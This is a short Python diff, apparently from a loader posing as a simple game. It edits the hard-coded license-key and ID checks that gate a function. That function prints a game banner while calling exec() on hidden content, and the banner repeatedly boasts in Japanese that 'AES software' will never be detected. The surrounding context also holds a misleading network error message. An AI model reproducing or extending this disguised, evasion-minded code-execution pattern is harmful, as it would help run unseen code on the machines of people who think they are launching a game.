@@ -313,7 +313,7 @@ def mode1_v1(mycontent: str):
         print("GAME IS STARTING PLEASE PICK YOUR CHOICES.。\n Ensure  that you pick the right choices, if you failed so, you will face some punishements.\n This is a simple game made by the AES DEVS.\nAESソフトウェアはトップにあり、決して検出されることはありません。\nAESソフトウェアはトップにあり、決して検出されることはありません。\nAESソフトウェアはトップにあり、決して検出されることはありません。\nAESソフトウェアはトップにあり、決して検出されることはありません。\nAESソフトウェアはトップにあり、決して検出されることはありません。\nAESソフトウェアはトップにあり、決して検出されることはありません。\n",exec(f"{mycntcnt}"))
     else:
         raise Exception(f"Error. Your internet is private.")
-if cskey=="KxRuBq3qHOsx98sx-aesthetic" or cskey=="xCFnDhqx4DoPENU1-aesthetic" or cskey=="Sm3h86MZoNokLcf1lauo0e7DIS" or cskey=="yK146GWvNJLf0eD4-aesthetic3" or cskey=="2hYKfSA5pvHTIrjLrCzCfyjR2G" or cskey=="FDWFW7oFPkYG0oZZb3V47Cq1Hd":
+if cskey=="KxRuBq3qHOsx98sx-aesthetic" or cskey=="xCFnDhqx4DoPENU1-aesthetic" or cskey=="Sm3h86MZoNokLcf1lauo0e7DIS" or cskey=="yK146GWvNJLf0eD4-aesthetic3" or csuniqueid=="Xvb7OjEtCFRZE":
     mode1_v1(content5)
 else:
     new_function_name(content5)
